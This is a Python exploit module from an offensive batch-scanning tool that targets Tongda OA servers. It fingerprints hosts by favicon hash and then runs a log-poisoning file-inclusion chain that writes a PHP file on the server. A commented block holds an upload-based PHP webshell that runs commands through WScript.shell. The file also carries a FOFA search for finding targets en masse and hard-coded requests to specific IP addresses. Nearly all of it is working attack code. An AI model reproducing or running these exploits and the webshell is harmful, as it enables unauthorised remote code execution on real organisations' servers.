# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 14:34

import hashlib
import re

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: title="通达OA网络智能办公系统"
# python batch.py -m exploit.web.OA.Tongda.2000_lfi_rce -cs -fs "title=\"通达OA网络智能办公系统\""
class Script(BaseScript):
    name = 'Tongda'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/ispirit/im/upload.php', '/ispirit/interface/gateway.php']
        self.execPathList2 = ["/ispirit/interface/gateway.php?json{}&a=<?php file_put_contents ('111111111.php','1111111111111111111'); ?>",
                              '/ispirit/interface/gateway.php?json={}&url=../../ispirit/../../nginx/logs/oa.access.log',
                              '/ispirit/interface/111111111.php']
    
        # session
        self.session = session
        # 相关信息
        self.info = ''''''
        self.favicon = ['ed0044587917c76d08573577c8b72883']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Tongda Finger', url))
                                return {'name': 'Tongda Finger', 'url': url, 'software': 'Tongda'}
        except Exception:
            return None

    async def exec(self):
        try:
            # url = f'http://{self.target}{self.execPathList[0]}' if self.target.startswith(
            #     ('http:', 'https:')) is False else f'{self.target}{self.execPathList[0]}'
            # headers = {
            #     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            #     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            #     "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate",
            #     "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1",
            #     "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
            # data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
            # async with session.post(url=url, headers=headers, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
            #     if response is not None:
            #         text = await response.text()
            #         await asyncio.sleep(2)
            #         # path = text[text.find('@') + 1:text.rfind('|')].replace("_", "/").replace("|", ".")
            #         filename = "".join(re.findall("2003_(.+?)\|", text))
            #         # path = text[text.find('@') + 1:text.rfind('|')].replace("_", "\/").replace("|", ".")
            #         # data1 = {"json": "{\"url\":\"../../../general/../attach/im/%s\"}" % path, "f": "echo fffhhh"}
            #         data1 = "json={\"url\":\"../../../general/../attach/im/2003/%s.jpg\"}&cmd=%s" % (filename, "echo chacha")
            #         url1 = f'http://{self.target}{self.execPathList[1]}' if self.target.startswith(
            #             ('http:', 'https:')) is False else f'{self.target}{self.execPathList[1]}'
            #         headers1 = {
            #             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            #             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            #             "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            #             "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close",
            #             "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
            #         async with session.post(url=url1, headers=headers1, data=data1) as response1:
            #             if response1 is not None and response1.status == 200:
            #                 text1 = await response1.text()
            #                 await asyncio.sleep(2)
            #                 if 'chacha' in text1:
            #                     tqdm.write(Fore.RED + '[{}] {}'.format('Tongda Lfi RCE', url))
            #                     return {'name': 'Tongda Lfi RCE', 'url': url, 'software': 'Tongda'}
            url = f'http://{self.target}{self.execPathList2[0]}' if self.target.startswith(
                ('http:', 'https:')) is False else f'{self.target}{self.execPathList2[0]}'
            async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                url1 = f'http://{self.target}{self.execPathList2[1]}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{self.execPathList2[1]}'
                async with self.session.get(url=url1, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response1:
                    url2 = f'http://{self.target}{self.execPathList2[2]}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{self.execPathList2[2]}'
                    async with self.session.get(url=url2, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response2:
                        if response2 is not None:
                            text = await response2.text()
                            print(text)
                            await asyncio.sleep(2)
                            if '1111111111111111111' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('Tongda LFI', url))
                                return {'name': 'Tongda LFI', 'url': url, 'software': 'Tongda'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://61.133.220.102:88/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
